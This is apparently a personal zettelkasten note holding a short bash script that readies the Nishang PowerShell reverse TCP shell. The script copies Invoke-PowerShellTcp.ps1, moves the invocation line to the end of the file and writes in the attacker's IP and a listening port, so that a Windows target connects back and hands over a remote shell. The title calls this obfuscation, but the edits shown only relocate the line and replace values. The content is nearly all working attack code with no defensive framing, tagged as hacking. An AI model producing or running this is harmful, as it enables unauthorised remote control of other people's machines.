# script to obfuscate a nishang reverse tcp shell for windows powershell

- concept of `script to obfuscate a nishang reverse tcp shell for windows powershell`
- must have nishang package installed
  - [x] add error handling

```bash
#!/bin/bash

ATTACKER=$(getmyip)
PORT=$1
if [ -z "$PORT" ]; then
  export PORT=4444
fi
cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 nishang.ps1
# take the line, move to end and remove "PS >"
ex -s -c 'g/Invoke.*Tcp -Rev.*192.168.254.226/m$' -c '$s/PS > //' -c wq nishang.ps1
# edit the IP
ex -s -c "\$s/192.168.254.226/$ATTACKER/" -c wq nishang.ps1
# edit the port
ex -s -c "\$s/4444/$PORT/" -c wq nishang.ps1
```

` zet/20230906044835/README.md `

# Related

- [20230906033259](/zet/20230906033259/README.md) functions to copy over and possibly remake as commands
- [20230906033727](/zet/20230906033727/README.md) commands to get ip

Tags:

    #shortcmd #script #hacking
